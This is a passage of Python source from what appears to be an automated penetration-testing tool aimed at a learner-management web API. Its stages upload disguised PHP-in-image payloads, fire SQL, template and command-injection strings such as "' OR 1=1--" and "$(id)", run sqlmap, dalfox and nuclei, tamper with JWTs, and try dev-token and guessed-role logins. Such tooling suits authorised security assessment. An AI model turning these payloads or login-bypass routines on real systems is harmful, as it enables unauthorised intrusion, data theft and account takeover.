                    body = resp_raw.json()
                    if body.get("status") is True:
                        f = {"type": f"upload_bypass_{test_name}", "severity": HIGH,
                             "detail": f"PHP content accepted in {filename}",
                             "url": f"{session.base_url}/add-learner/",
                             "evidence": f"{filename} with PHP content → 'registered successfully'"}
                        findings.append(f)
                        if saver:
                            saver.save(f)
                            saver.save_txt(f)
            except Exception:
                pass
            finally:
                os.unlink(tmp.name)

        log("ok", f"  {len(findings)} upload findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 6b: FILE TYPE EVASION (Magika-validated)
# ═══════════════════════════════════════════════════════════════════════════════

class FileTypeEvasionTester:
    """Systematic file-type evasion testing using polyglot payloads.

    Uploads disguised payloads (PHP-in-JPEG, JS-in-SVG, etc.) and uses
    Magika to verify whether the server stored executable content.
    """

    def run(self, session: AuthSession, upload_endpoints: list[str] = None,
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 6b: File Type Evasion Testing (Magika)")
        findings = []
        matrix = []  # Upload test matrix for reporting

        try:
            from payloads import generate_upload_payloads, UploadPayload
            from file_classifier import get_classifier
        except ImportError as e:
            log("warn", f"  Skipping Phase 6b — missing dependency: {e}")
            return findings

        fc = get_classifier()
        payloads = generate_upload_payloads()
        log("info", f"  {len(payloads)} evasion payloads across 7 technique categories")

        # Discover upload endpoints if not provided
        if not upload_endpoints:
            upload_endpoints = []
            # Common upload paths to probe
            for path in ["add-learner/", "upload/", "api/upload/", "api/v1/upload/",
                         "api/files/", "avatar/", "profile/image/", "media/upload/"]:
                try:
                    resp = session.request("OPTIONS", path)
                    if resp["status"] < 405:
                        upload_endpoints.append(path)
                except Exception:
                    pass
            if not upload_endpoints:
                upload_endpoints = ["add-learner/"]  # Fallback to known endpoint

        for endpoint in upload_endpoints:
            log("info", f"  Testing: {endpoint}")
            for payload in payloads:
                row = {
                    "endpoint": endpoint,
                    "technique": payload.technique,
                    "filename": payload.filename,
                    "upload_ok": False,
                    "accessible": False,
                    "true_type": "",
                    "result": "SAFE",
                }
                try:
                    import requests as _req
                    cookies = {}
                    if hasattr(session, '_session') and hasattr(session._session, 'cookies'):
                        cookies = dict(session._session.cookies)

                    # Upload the payload
                    tmp = tempfile.NamedTemporaryFile(
                        suffix=f"_{payload.filename}", delete=False
                    )
                    tmp.write(payload.content)
                    tmp.close()

                    resp_raw = _req.post(
                        f"{session.base_url}/{endpoint}",
                        files={"image": (payload.filename, open(tmp.name, "rb"),
                                         payload.claimed_mime)},
                        data={"first_name": "VAPTEvasion", "last_name": "Test",
                              "email": f"vapt_evasion_{int(time.time())}@test.com",
                              "contact_no": f"98765{int(time.time()) % 100000:05d}",
                              "country_code": "IN"},
                        cookies=cookies, verify=VERIFY_TLS, timeout=15,
                    )
                    os.unlink(tmp.name)

                    if resp_raw.status_code == 200:
                        row["upload_ok"] = True
                        try:
                            body = resp_raw.json()
                            if body.get("status") is True:
                                row["upload_ok"] = True
                        except Exception:
                            pass

                    if not row["upload_ok"]:
                        matrix.append(row)
                        continue

                    # Try to access/download the uploaded file and classify
                    # Check common storage paths
                    for storage_path in [
                        f"media/{payload.filename}",
                        f"uploads/{payload.filename}",
                        f"static/uploads/{payload.filename}",
                    ]:
                        try:
                            dl_resp = _req.get(
                                f"{session.base_url}/{storage_path}",
                                cookies=cookies, verify=VERIFY_TLS, timeout=10,
                            )
                            if dl_resp.status_code == 200 and len(dl_resp.content) > 10:
                                row["accessible"] = True
                                # Classify the downloaded file with Magika
                                classify_result = fc.classify_bytes(
                                    dl_resp.content,
                                    claimed_mime=payload.claimed_mime,
                                )
                                row["true_type"] = classify_result.true_type

                                # Verdict: if Magika detects the dangerous payload type
                                if classify_result.risk_tier in ("critical", "high"):
                                    row["result"] = "VULN"
                                    severity = (CRITICAL if classify_result.risk_tier == "critical"
                                                else HIGH)
                                    f = {
                                        "type": "upload_type_bypass",
                                        "severity": severity,
                                        "detail": (
                                            f"File type validation bypass via {payload.technique}: "
                                            f"uploaded {payload.filename} as {payload.claimed_mime}, "
                                            f"true type: {classify_result.true_type}"
                                        ),
                                        "url": f"{session.base_url}/{endpoint}",
                                        "evidence": (
                                            f"Technique: {payload.technique} | "
                                            f"Filename: {payload.filename} | "
                                            f"Claimed MIME: {payload.claimed_mime} | "
                                            f"True type: {classify_result.true_type} "
                                            f"({classify_result.mime}) | "
                                            f"Confidence: {classify_result.confidence:.0%} | "
                                            f"Risk: {classify_result.risk_tier}"
                                        ),
                                        "file_type_info": {
                                            "claimed_mime": payload.claimed_mime,
                                            "claimed_ext": payload.filename.rsplit(".", 1)[-1],
                                            "true_type": classify_result.true_type,
                                            "true_mime": classify_result.mime,
                                            "confidence": classify_result.confidence,
                                            "risk_tier": classify_result.risk_tier,
                                            "technique": payload.technique,
                                        },
                                    }
                                    findings.append(f)
                                    if saver:
                                        saver.save(f)
                                        saver.save_txt(f)
                                    log("ok", f"  VULN: {payload.technique} → "
                                        f"{classify_result.true_type} ({severity})")
                                break  # Found it, stop checking storage paths
                        except Exception:
                            continue

                except Exception as e:
                    log("warn", f"  Error testing {payload.filename}: {e}")
                finally:
                    matrix.append(row)

        # Save the upload test matrix for reporter.py
        if matrix and saver:
            matrix_path = os.path.join(
                os.path.dirname(saver._base_dir) if hasattr(saver, '_base_dir')
                else ".", "upload_evasion_matrix.json"
            )
            try:
                with open(matrix_path, "w") as f:
                    json.dump(matrix, f, indent=2)
            except Exception:
                pass

        log("ok", f"  {len(findings)} evasion findings from {len(matrix)} tests")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 7: INJECTION
# ═══════════════════════════════════════════════════════════════════════════════

class InjectionTester:
    """SQLi, SSTI, command injection on key parameters."""

    SQLI_PAYLOADS = ["' OR 1=1--", "' UNION SELECT 1--", "'; DROP TABLE--",
                     "1' AND (SELECT 1 FROM pg_sleep(3))--"]
    SSTI_PAYLOADS = ["{{7*7}}", "${7*7}", "#{7*7}", "{% debug %}"]
    CMD_PAYLOADS = ["; id", "| id", "$(id)", "`id`"]

    def run(self, session: AuthSession, endpoints: list[dict],
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 7: Injection Testing")
        findings = []

        # 7a. SQLi on search/filter params
        search_endpoints = [ep for ep in endpoints if any(
            kw in ep["path"] for kw in ("list", "report", "view")
        )][:10]

        for ep in search_endpoints:
            for payload in self.SQLI_PAYLOADS[:2]:
                start = time.monotonic()
                resp = session.request("POST", ep["path"],
                                       json_body={"search": payload})
                elapsed = time.monotonic() - start
                if elapsed > 3.0:
                    f = {"type": "sqli_time_based", "severity": CRITICAL,
                         "detail": f"Time-based SQLi: {elapsed:.1f}s delay on {ep['path']}",
                         "url": resp["url"],
                         "evidence": f"search='{payload}' → {elapsed:.1f}s (baseline <0.5s)"}
                    findings.append(f)
                    if saver:
                        saver.save(f)
                        saver.save_txt(f)
                body_str = str(resp.get("body", ""))
                if "syntax error" in body_str.lower() or "sql" in body_str.lower():
                    f = {"type": "sqli_error_based", "severity": HIGH,
                         "detail": f"SQL error in response on {ep['path']}",
                         "url": resp["url"],
                         "evidence": f"search='{payload}' → SQL error in response"}
                    findings.append(f)
                    if saver:
                        saver.save(f)
                        saver.save_txt(f)

        # 7b. SQLi on login
        login_payloads = [("' OR 1=1--", "test"), ("admin'--", "test")]
        for email, pwd in login_payloads:
            import requests as _req
            resp = _req.post(f"{session.base_url}/login-view/",
                             data={"email": email, "password": pwd},
                             verify=VERIFY_TLS, timeout=10)
            if resp.status_code == 200:
                try:
                    body = resp.json()
                    if body.get("status") is True:
                        f = {"type": "sqli_auth_bypass", "severity": CRITICAL,
                             "detail": f"SQL injection bypassed login with email='{email}'",
                             "url": f"{session.base_url}/login-view/",
                             "evidence": f"email='{email}' → login success"}
                        findings.append(f)
                        if saver:
                            saver.save(f)
                            saver.save_txt(f)
                except Exception:
                    pass

        # 7c. sqlmap verification on confirmed SQLi candidates
        sqli_urls = [f["url"] for f in findings if "sqli" in f["type"]]
        if sqli_urls:
            log("info", f"  Running sqlmap on {len(sqli_urls)} confirmed SQLi candidate(s)...")
            for sqli_url in sqli_urls[:3]:  # Max 3 to avoid long waits
                try:
                    import subprocess as _sp
                    sqlmap_out = os.path.join(
                        os.path.dirname(saver.dir) if saver else "/tmp",
                        "sqlmap_verify")
                    os.makedirs(sqlmap_out, exist_ok=True)
                    result = _sp.run([
                        "sqlmap", "-u", sqli_url,
                        "--batch", "--level=3", "--risk=2",
                        "--random-agent", "--timeout=15",
                        "--current-db", "--current-user",
                        "--output-dir", sqlmap_out,
                    ], capture_output=True, text=True, timeout=120)
                    output = result.stdout
                    # Check if sqlmap confirmed injection
                    if "is vulnerable" in output or "Type:" in output:
                        # Extract DB info
                        db_info = ""
                        for line in output.split("\n"):
                            if "current database:" in line.lower() or "current user:" in line.lower():
                                db_info += line.strip() + "; "
                            if "Type:" in line:
                                db_info += line.strip() + "; "
                        f = {"type": "sqli_sqlmap_confirmed", "severity": CRITICAL,
                             "detail": f"sqlmap CONFIRMED SQLi on {sqli_url} — {db_info[:200]}",
                             "url": sqli_url,
                             "evidence": f"sqlmap --level=3 --risk=2 confirmed injection. {db_info[:300]}"}
                        findings.append(f)
                        if saver:
                            saver.save(f)
                            saver.save_txt(f)
                        log("vuln", f"  sqlmap CONFIRMED: {sqli_url}")
                    else:
                        log("info", f"  sqlmap could not confirm: {sqli_url}")
                except FileNotFoundError:
                    log("warn", "  sqlmap not installed — skipping verification")
                    break
                except _sp.TimeoutExpired:
                    log("warn", f"  sqlmap timed out on {sqli_url}")
                except Exception as e:
                    log("warn", f"  sqlmap error: {e}")

        # 7d. dalfox XSS verification on parameterized endpoints
        param_urls = [ep for ep in endpoints if any(
            kw in ep["path"] for kw in ("list", "view", "search", "report")
        )][:10]
        if param_urls:
            log("info", f"  Running dalfox XSS on {len(param_urls)} endpoint(s)...")
            for ep in param_urls[:5]:
                try:
                    import subprocess as _sp
                    target_url = f"{session.base_url}/{ep['path'].lstrip('/')}?search=test"
                    result = _sp.run(
                        ["dalfox", "url", target_url, "--silence", "--skip-bav",
                         "--timeout", "10", "--worker", "5"],
                        capture_output=True, text=True, timeout=60)
                    if result.stdout.strip():
                        for line in result.stdout.strip().split("\n")[:3]:
                            f = {"type": "xss_dalfox_confirmed", "severity": HIGH,
                                 "detail": f"dalfox confirmed XSS on {ep['path']}: {line[:100]}",
                                 "url": target_url,
                                 "evidence": line[:300]}
                            findings.append(f)
                            if saver:
                                saver.save(f)
                                saver.save_txt(f)
                            log("vuln", f"  dalfox XSS: {line[:80]}")
                except FileNotFoundError:
                    log("warn", "  dalfox not installed — skipping XSS verification")
                    break
                except Exception:
                    pass

        # 7e. nuclei scan for common vulns on live endpoints
        if endpoints:
            log("info", f"  Running nuclei on {min(len(endpoints), 20)} endpoint(s)...")
            try:
                import subprocess as _sp
                import tempfile
                urls_file = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
                for ep in endpoints[:20]:
                    urls_file.write(f"{session.base_url}/{ep['path'].lstrip('/')}\n")
                urls_file.close()
                nuclei_out = os.path.join(
                    os.path.dirname(saver.dir) if saver else "/tmp",
                    "nuclei_results.txt")
                # v9.x P0-6: prefer ~/go/bin/nuclei to avoid PATH shadowing
                # (Python httpx pip pkg shadows PD httpx; same risk for nuclei).
                _gobin_nuclei = os.path.expanduser("~/go/bin/nuclei")
                _nuclei_bin = _gobin_nuclei if os.path.isfile(_gobin_nuclei) and os.access(_gobin_nuclei, os.X_OK) else "nuclei"
                result = _sp.run(
                    [_nuclei_bin, "-l", urls_file.name,
                     "-severity", "critical,high,medium", "-silent",
                     "-o", nuclei_out],
                    capture_output=True, text=True, timeout=120)
                if os.path.isfile(nuclei_out) and os.path.getsize(nuclei_out) > 0:
                    with open(nuclei_out) as nf:
                        for line in nf:
                            line = line.strip()
                            if line:
                                sev = CRITICAL if "critical" in line.lower() else HIGH
                                f = {"type": "nuclei_finding", "severity": sev,
                                     "detail": f"nuclei: {line[:150]}",
                                     "url": session.base_url,
                                     "evidence": line[:300]}
                                findings.append(f)
                                if saver:
                                    saver.save(f)
                                    saver.save_txt(f)
                                log("vuln", f"  nuclei: {line[:80]}")
                    log("ok", f"  nuclei: {sum(1 for _ in open(nuclei_out))} finding(s)")
                else:
                    log("info", "  nuclei: 0 findings")
                os.unlink(urls_file.name)
            except FileNotFoundError:
                log("warn", "  nuclei not installed — skipping CVE scan")
            except Exception as e:
                log("warn", f"  nuclei error: {e}")

        log("ok", f"  {len(findings)} injection findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 8a: NoSQL DIFFERENTIAL PROBE
# ═══════════════════════════════════════════════════════════════════════════════
# Added v9.x after the api-maya / hrms-user-gateway engagement, where the
# old single-payload check (``{"$gt": ""}`` → 500) generated dozens of
# false-positive "NoSQL injection" findings that Codex review showed were
# actually generic type-confusion crashes. The fix is a six-probe diff
# implemented in ``whitebox/nosql_probe.py``.
class NoSQLProbeRunner:
    """Phase 8a wrapper around ``whitebox.nosql_probe.NoSQLProbe``.

    Picks endpoints that look like login / search / lookup handlers, runs
    the six differential probes against the most likely user-controlled
    parameter, and persists VULNERABLE / TYPE_CONFUSION verdicts via the
    standard ``FindingSaver``.
    """

    # Parameters most often reflected straight into a Mongo / Mongoose
    # query without coercion.
    LIKELY_PARAMS = ("email", "username", "user", "id", "search", "q",
                     "query", "filter", "name")

    # Path keywords that hint at a query or lookup handler.
    PATH_KEYWORDS = ("login", "auth", "search", "lookup", "find", "list",
                     "view", "filter", "query")

    MAX_ENDPOINTS = 12  # safety cap — each endpoint is 6 requests

    def run(self, session: AuthSession, endpoints: list[dict],
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 8a: NoSQL Differential Probe")
        try:
            from whitebox.nosql_probe import NoSQLProbe, to_finding
        except Exception as e:
            log("err", f"  whitebox.nosql_probe import failed: {e}")
            return []

        candidates = [
            ep for ep in endpoints
            if any(kw in ep.get("path", "").lower() for kw in self.PATH_KEYWORDS)
        ][: self.MAX_ENDPOINTS]

        if not candidates:
            log("info", "  No login/search/lookup endpoints — skipping")
            return []

        findings: list[dict] = []
        # Reuse the AuthSession's existing session cookies + bearer token by
        # extracting them once into a plain headers dict for the probe.
        base_headers = dict(session._session.headers) if hasattr(session, "_session") else {}
        base_url = session.base_url.rstrip("/")

        for ep in candidates:
            path = ep.get("path", "").lstrip("/")
            full_url = f"{base_url}/{path}"
            for param in self.LIKELY_PARAMS[:3]:  # 3 params max per endpoint
                template = {param: "<INJECT>"}
                # Login-style endpoints expect a password too.
                if "login" in path or "auth" in path:
                    template.setdefault("password", "vapt-probe")

                try:
                    result = NoSQLProbe(
                        url=full_url,
                        headers=base_headers,
                        template=template,
                        method=ep.get("method", "POST"),
                        param=param,
                    ).run()
                except Exception as e:
                    log("warn", f"  probe error on {path}/{param}: {e}")
                    continue

                finding = to_finding(result, full_url, param)
                if finding is None:
                    continue
                findings.append(finding)
                if saver:
                    saver.save(finding)
                    saver.save_txt(finding)
                # First hit per endpoint is enough — move on.
                break

        log("ok", f"  {len(findings)} NoSQL probe findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 8: INFO DISCLOSURE
# ═══════════════════════════════════════════════════════════════════════════════

class InfoDisclosureScanner:
    """Debug pages, error messages, server headers, credential leaks."""

    def run(self, session: AuthSession, endpoints: list[dict],
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 8: Information Disclosure Testing")
        findings = []

        # 8a. Django DEBUG page
        import requests as _req
        try:
            resp = _req.post(f"{session.base_url}/nonexistent_probe/",
                             data={}, verify=VERIFY_TLS, timeout=10)
            if "DEBUG = True" in resp.text:
                f = {"type": "django_debug", "severity": CRITICAL,
                     "detail": "Django DEBUG=True — tracebacks, settings, URL patterns exposed",
                     "url": f"{session.base_url}/nonexistent_probe/",
                     "evidence": "DEBUG=True in response, ALLOWED_HOSTS visible"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)
        except Exception:
            pass

        # 8b. Server header disclosure
        try:
            resp = _req.head(session.base_url, verify=VERIFY_TLS, timeout=10)
            server = resp.headers.get("Server", "")
            if server and any(v in server.lower() for v in ("nginx/", "apache/", "gunicorn", "iis/")):
                f = {"type": "server_version", "severity": LOW,
                     "detail": f"Server version disclosed: {server}",
                     "url": session.base_url, "evidence": f"Server: {server}"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)
        except Exception:
            pass

        # 8c. SMTP credentials
        resp = session.request("POST", "list-smtp/", json_body={})
        if resp["status"] == 200 and isinstance(resp["body"], dict):
            data = resp["body"].get("data", [])
            if isinstance(data, list) and data:
                smtp_info = data[0] if isinstance(data[0], dict) else {}
                if smtp_info.get("smtp_server") or smtp_info.get("smtp_user"):
                    f = {"type": "smtp_credential_exposure", "severity": MEDIUM,
                         "detail": f"SMTP credentials exposed: {smtp_info.get('smtp_server')} / {smtp_info.get('smtp_user')}",
                         "url": f"{session.base_url}/list-smtp/",
                         "evidence": f"smtp_server={smtp_info.get('smtp_server')}"}
                    findings.append(f)
                    if saver:
                        saver.save(f)
                        saver.save_txt(f)

        # 8d. Verbose error messages (DB schema leak)
        resp = session.request("POST", "generate-live-test-result/",
                               data={"learner_id": "1", "live_test_id": "1"})
        body_str = json.dumps(resp["body"], default=str) if isinstance(resp["body"], dict) else str(resp["body"])
        if any(kw in body_str for kw in ("violates not-null constraint", "DETAIL:", "Failing row",
                                          "foreign key constraint", "relation \"", "column \"")):
            f = {"type": "db_schema_leak", "severity": HIGH,
                 "detail": "PostgreSQL error messages leak table/column names and row data",
                 "url": resp["url"],
                 "evidence": body_str[:200]}
            findings.append(f)
            if saver:
                saver.save(f)
                saver.save_txt(f)

        log("ok", f"  {len(findings)} info disclosure findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 9: RATE LIMITING
# ═══════════════════════════════════════════════════════════════════════════════

class RateLimitTester:
    """Test rate limiting on authentication and sensitive endpoints."""

    SENSITIVE_PATHS = ["login-view/", "change-learner-password/",
                       "reset-password-request/"]

    def run(self, session: AuthSession, saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 9: Rate Limiting Testing")
        findings = []
        import requests as _req

        for path in self.SENSITIVE_PATHS:
            statuses = []
            for i in range(10):
                try:
                    if path == "login-view/":
                        resp = _req.post(f"{session.base_url}/{path}",
                                         data={"email": "test@test.com", "password": "wrong"},
                                         verify=VERIFY_TLS, timeout=5)
                    else:
                        cookies = dict(session._session.cookies) if hasattr(session, '_session') else {}
                        resp = _req.post(f"{session.base_url}/{path}",
                                         data={"email": "test@test.com", "id": "1"},
                                         cookies=cookies, verify=VERIFY_TLS, timeout=5)
                    statuses.append(resp.status_code)
                    if resp.status_code == 429:
                        break
                except Exception:
                    break

            if 429 not in statuses and len(statuses) >= 8:
                f = {"type": "missing_rate_limit", "severity": MEDIUM,
                     "detail": f"No rate limiting on {path} after {len(statuses)} rapid requests",
                     "url": f"{session.base_url}/{path}",
                     "evidence": f"{len(statuses)} requests, statuses: {set(statuses)}"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)

        log("ok", f"  {len(findings)} rate limit findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 10: TOKEN SECURITY
# ═══════════════════════════════════════════════════════════════════════════════

class TokenSecurityTester:
    """JWT analysis and refresh token abuse."""

    def run(self, session: AuthSession, token: str,
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 10: Token Security Testing")
        findings = []

        payload = JWTHelper.decode_payload(token)
        header = JWTHelper.decode_header(token)

        # 10a. Token analysis
        log("info", f"  JWT alg: {header.get('alg')}, exp: {payload.get('exp')}")
        exp = payload.get("exp", 0)
        iat = payload.get("iat", 0)
        if exp and iat:
            lifetime = exp - iat
            if lifetime > 86400:
                f = {"type": "long_token_lifetime", "severity": MEDIUM,
                     "detail": f"JWT lifetime too long: {lifetime}s ({lifetime//3600}h)",
                     "url": session.base_url, "evidence": f"exp-iat={lifetime}s"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)

        # 10b. Refresh token abuse (tampered access + valid refresh)
        tampered = JWTHelper.tamper_signature(token)
        cookies = dict(session._session.cookies) if hasattr(session, '_session') else {}
        cf_rt = cookies.get("cf_rt", "")
        if cf_rt:
            import requests as _req
            resp = _req.post(f"{session.base_url}/learner-list/",
                             json={}, cookies={"cf_at": tampered, "cf_rt": cf_rt},
                             verify=VERIFY_TLS, timeout=10)
            if resp.status_code == 200:
                f = {"type": "refresh_token_bypass", "severity": HIGH,
                     "detail": "Invalid access token + valid refresh token = authenticated (silent re-auth)",
                     "url": f"{session.base_url}/learner-list/",
                     "evidence": f"Tampered cf_at + valid cf_rt → HTTP {resp.status_code}"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)

        log("ok", f"  {len(findings)} token security findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 11: TIMING ORACLES
# ═══════════════════════════════════════════════════════════════════════════════

class TimingOracle:
    """Detect user enumeration via response timing."""

    def run(self, session: AuthSession, saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 11: Timing Oracle Testing")
        findings = []
        import requests as _req

        # Test password reset timing
        base = session.base_url.replace("/api/organization", "/api/learner")
        valid_times = []
        invalid_times = []

        for email in ["test@test.com", "mahesh.kumar@cyberfrat.com"]:
            start = time.monotonic()
            try:
                _req.post(f"{base}/reset-password-request/",
                          data={"email": email}, verify=VERIFY_TLS, timeout=15)
            except Exception:
                pass
            valid_times.append(time.monotonic() - start)

        for email in ["nonexistent_xyz@fake.com", "definitely_not_real@test.com"]:
            start = time.monotonic()
            try:
                _req.post(f"{base}/reset-password-request/",
                          data={"email": email}, verify=VERIFY_TLS, timeout=15)
            except Exception:
                pass
            invalid_times.append(time.monotonic() - start)

        avg_valid = sum(valid_times) / len(valid_times) if valid_times else 0
        avg_invalid = sum(invalid_times) / len(invalid_times) if invalid_times else 0

        if avg_valid > 0 and avg_invalid > 0 and avg_valid / max(avg_invalid, 0.01) > 5:
            f = {"type": "timing_oracle_user_enum", "severity": MEDIUM,
                 "detail": f"User enumeration via reset-password timing: valid={avg_valid:.1f}s vs invalid={avg_invalid:.1f}s",
                 "url": f"{base}/reset-password-request/",
                 "evidence": f"Valid email: {avg_valid:.1f}s, Invalid: {avg_invalid:.1f}s ({avg_valid/max(avg_invalid,0.01):.0f}x difference)"}
            findings.append(f)
            if saver:
                saver.save(f)
                saver.save_txt(f)

        log("ok", f"  {len(findings)} timing oracle findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 12: CHAIN BUILDER
# ═══════════════════════════════════════════════════════════════════════════════

class ChainBuilder:
    """Cross-reference findings for exploit chain escalation."""

    CHAINS = [
        (["idor", "privilege_escalation"], CRITICAL, "IDOR + Priv Esc = Full data breach"),
        (["upload_bypass", "arbitrary_upload"], CRITICAL, "Upload bypass + S3 = Stored XSS/Phishing"),
        (["db_schema_leak", "sqli"], CRITICAL, "Schema leak + SQLi = Database compromise"),
        (["missing_rate_limit", "timing_oracle"], HIGH, "No rate limit + timing oracle = Account enumeration + brute force"),
        (["django_debug", "db_schema_leak"], HIGH, "Debug mode + DB errors = Full application internals exposed"),
        (["refresh_token_bypass", "idor"], CRITICAL, "Token bypass + IDOR = Persistent unauthorized data access"),
        (["smtp_credential_exposure", "missing_rate_limit"], HIGH, "SMTP creds + no rate limit = Phishing infrastructure"),
        (["score_manipulation", "idor"], HIGH, "Score manipulation + IDOR = Tamper any student's grades"),
    ]

    def run(self, all_findings: list[dict], saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 12: Chain Building")
        chains = []
        finding_types = {f["type"] for f in all_findings}

        for required_types, severity, description in self.CHAINS:
            if all(any(rt in ft for ft in finding_types) for rt in required_types):
                chain = {"type": "exploit_chain", "severity": severity,
                         "detail": description,
                         "url": "N/A",
                         "evidence": f"Chain: {' + '.join(required_types)}"}
                chains.append(chain)
                if saver:
                    saver.save(chain)
                    saver.save_txt(chain)
                log("vuln", f"  CHAIN: {description}")

        log("ok", f"  {len(chains)} exploit chains identified")
        return chains


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════════════

def _auto_detect_login_url(session: AuthSession, username: str, password: str) -> tuple:
    """Try common login URL patterns and return (token, login_path) or ("", "").

    Tries standard login paths first, then dev/staging token endpoints.
    Detects auth type from response (JWT in body, cookies, or bearer token).
    """
    import requests as _req
    base = session.base_url

    # ── Standard login paths (try with both JSON body key patterns) ───────
    COMMON_LOGIN_PATHS = [
        "auth/login", "auth/login/", "login-view/", "login/", "login",
        "api/auth/login", "api/auth/login/", "api/login/", "api/login",
        "v1/auth/login/", "v1/auth/login", "api/v1/login/",
        "sign-in/", "auth/sign-in/", "api/sign-in/",
        "api/token/", "oauth/token/", "v1/login/", "v2/auth/login/",
        "users/login/", "account/login/",
    ]

    for path in COMMON_LOGIN_PATHS:
        token = session.auto_login(path, username, password)
        if token:
            log("ok", f"  Login URL auto-detected: {path}")
            return token, path
        # Reset session state for next attempt
        session._session.cookies.clear()
        session.token = None
        if "Authorization" in session._session.headers:
            del session._session.headers["Authorization"]

    # ── Dev/staging token endpoints (some apps expose /dev/token) ─────────
    DEV_TOKEN_PATHS = ["dev/token", "dev/token/"]
    # Extract role from email (e.g., dpo@acme → role=dpo)
    role_guess = username.split("@")[0] if "@" in username else "admin"
    # Extract tenant from email domain (e.g., dpo@acme-financial.dev → slug=acme-financial)
    tenant_guess = ""
    if "@" in username:
        domain_part = username.split("@")[1]
        tenant_guess = domain_part.rsplit(".", 1)[0]  # strip TLD

    for path in DEV_TOKEN_PATHS:
        url = f"{base}/{path.lstrip('/')}"
        for payload in [
            {"role": role_guess, "tenantSlug": tenant_guess},
            {"role": "admin", "tenantSlug": tenant_guess},
            {"email": username, "password": password},
        ]:
            try:
                resp = _req.post(url, json=payload, verify=VERIFY_TLS, timeout=10)
                if resp.status_code == 200:
                    body = resp.json()
                    token = body.get("token") or body.get("access_token") or ""
                    if token:
                        session.set_token(token)
                        log("ok", f"  Login via dev token endpoint: {path}")
                        return token, path
            except Exception:
                continue

    # ── CGI/legacy form login (parse HTML form and submit) ──────────────
    # For apps like Rediffmail Pro that use non-standard field names
    # (custom_input, domain, FormName, etc.)
    CGI_LOGIN_PAGES = [
        # (page to GET for form, fallback action URL)
        ("action/login/" + (domain_part if domain_part else ""), "cgi-bin/progold/loginepro.cgi"),
        ("cgi-bin/progold/loginepro.cgi", "cgi-bin/progold/loginepro.cgi"),
        ("cgi-bin/login.cgi", "cgi-bin/login.cgi"),
        ("admin/login/", "admin/login/"),
        ("login.php", "login.php"),
        ("login.asp", "login.asp"),
        ("Login.jsp", "Login.jsp"),
        ("j_security_check", "j_security_check"),
    ]
    # Map empty hidden field values to sensible defaults
    HIDDEN_FIELD_DEFAULTS = {
        "FormName": "existing", "reqsig": "PCWEB", "newBuilt": "1",
        "submit": "Login", "action": "login",
    }
    import re as _re
    user_part = username.split("@")[0] if "@" in username else username
    domain_part = username.split("@")[1] if "@" in username else ""

    for page_path, fallback_action in CGI_LOGIN_PAGES:
        try:
            # Fetch the login page to discover form fields
            login_page_url = f"{base}/{page_path.lstrip('/')}"
            page_resp = _req.get(login_page_url, verify=VERIFY_TLS, timeout=10,
                                  allow_redirects=True)
            if page_resp.status_code not in (200, 301, 302):
                continue

            html = page_resp.text
            # Find form action
            action_match = _re.search(r'<form[^>]*action=["\']([^"\']+)["\']', html, _re.I)
            action_url = action_match.group(1) if action_match else f"{base}/{fallback_action}"
            if action_url.startswith("/"):
                action_url = f"{_re.match(r'https?://[^/]+', base).group(0)}{action_url}"

            # Extract all input fields with their names and default values
            inputs = _re.findall(
                r'<input[^>]*name=["\']?([^"\'\s>]+)["\']?[^>]*(?:value=["\']?([^"\'\s>]*)["\']?)?',
                html, _re.I)
            form_data = {}
            for name, value in inputs:
                name = name.strip()
                val = value.strip() if value else ""
                # Map known field patterns to credentials
                if name.lower() in ("password", "passwd", "pwd", "pass", "user_password"):
                    form_data[name] = password
                elif name.lower() in ("username", "user", "login", "email", "user_id",
                                       "userid", "custom_input"):
                    form_data[name] = user_part
                elif name.lower() == "domain":
                    form_data[name] = domain_part
                elif val:
                    form_data[name] = val
                elif name in HIDDEN_FIELD_DEFAULTS:
                    form_data[name] = HIDDEN_FIELD_DEFAULTS[name]
                else:
                    form_data[name] = val

            if not form_data:
                continue

            log("info", f"  Trying CGI login: {path} ({len(form_data)} fields)")
            resp = _req.post(action_url, data=form_data, verify=VERIFY_TLS,
                              timeout=15, allow_redirects=False,
                              cookies=dict(page_resp.cookies))

            # Check for successful login (redirect with session cookies)
            cookies_set = resp.headers.get("Set-Cookie", "")
            if resp.status_code in (200, 301, 302):
                # Look for session cookies in response
                session_cookies = {}
                # Parse Set-Cookie headers from raw response
                for cookie_header in resp.raw.headers.getlist("Set-Cookie") if hasattr(resp.raw.headers, "getlist") else [cookies_set]:
                    for ck in _re.findall(r'(\w+)=([^;]+)', cookie_header):
                        if ck[0] in ("Rm", "Rsc", "Rl", "Rt", "Rh", "JSESSIONID", "session_id",
                                      "sessionid", "sid", "token", "cf_at", "IDPT4"):
                            session_cookies[ck[0]] = ck[1]
                # Also check resp.cookies
                for c in resp.cookies:
                    if c.name in ("Rm", "Rsc", "Rl", "Rt", "JSESSIONID", "cf_at", "token"):
                        session_cookies[c.name] = c.value

                if session_cookies:
                    # Set cookies on the session
                    for k, v in session_cookies.items():
                        session._session.cookies.set(k, v)
                    token = session_cookies.get("Rm") or session_cookies.get("cf_at") or \
